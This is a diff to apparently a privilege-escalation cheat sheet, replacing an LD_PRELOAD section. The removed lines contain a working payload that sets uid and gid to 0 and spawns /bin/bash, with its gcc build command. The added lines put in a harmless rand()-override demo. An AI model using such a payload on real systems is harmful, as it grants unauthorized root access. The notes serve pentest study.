@@ -93,22 +93,37 @@ sudo -l
 ```
 #### Leveraging LD_PRELOAD
 
+reference to the [blog](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)
+
+`random_num.c`
 ```
 #include <stdio.h>
-#include <sys/types.h>
 #include <stdlib.h>
+#include <time.h>
+ 
+int main(){
+  srand(time(NULL));
+  int i = 10;
+  while(i--) printf("%d\n",rand()%100);
+  return 0;
+}
+```
 
-void _init() {
-unsetenv("LD_PRELOAD");
-setgid(0);
-setuid(0);
-system("/bin/bash");
+`unrandom.c`
+```
+int rand(){
+    return 42; //the most random number in the universe
 }
 ```
 
 ```
-gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+gcc -shared -fPIC unrandom.c -o unrandom.so
 ```
+
+```
+LD_PRELOAD=$PWD/unrandom.so ./random_nums
+```
+
 
 
 #### Abusing `sudo` permission on `nano`
